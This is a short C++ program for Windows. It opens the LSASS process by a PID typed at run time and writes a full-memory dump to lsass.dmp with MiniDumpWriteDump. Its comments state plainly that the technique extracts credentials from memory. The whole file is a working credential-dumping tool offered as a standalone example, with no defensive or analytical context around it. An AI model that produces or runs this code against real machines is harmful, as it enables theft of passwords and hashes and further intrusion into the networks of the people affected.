#include <windows.h>
#include <iostream>
#include <dbghelp.h>

#pragma comment(lib, "dbghelp.lib")

// Dumps the memory of the LSASS process to a file.
// This technique is used to extract credentials from memory.
// Requires administrator privileges.

int main() {
    DWORD lsass_pid = 0;
    HANDLE lsass_handle = NULL;
    HANDLE outfile = NULL;
    
    // Find the LSASS process ID
    // A more robust implementation would enumerate processes.
    // This is a simplified example.
    // You can get the PID from Task Manager for testing.
    std::cout << "Enter LSASS PID: ";
    std::cin >> lsass_pid;

    // Open the LSASS process
    lsass_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsass_pid);
    if (lsass_handle == NULL) {
        std::cerr << "Failed to open LSASS process." << std::endl;
        return 1;
    }

    // Create the output file
    outfile = CreateFile("lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (outfile == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create output file." << std::endl;
        CloseHandle(lsass_handle);
        return 1;
    }

    // Dump the process memory
    if (MiniDumpWriteDump(lsass_handle, lsass_pid, outfile, MiniDumpWithFullMemory, NULL, NULL, NULL)) {
        std::cout << "LSASS memory dumped successfully." << std::endl;
    } else {
        std::cerr << "Failed to dump LSASS memory." << std::endl;
    }

    CloseHandle(lsass_handle);
    CloseHandle(outfile);

    return 0;
}
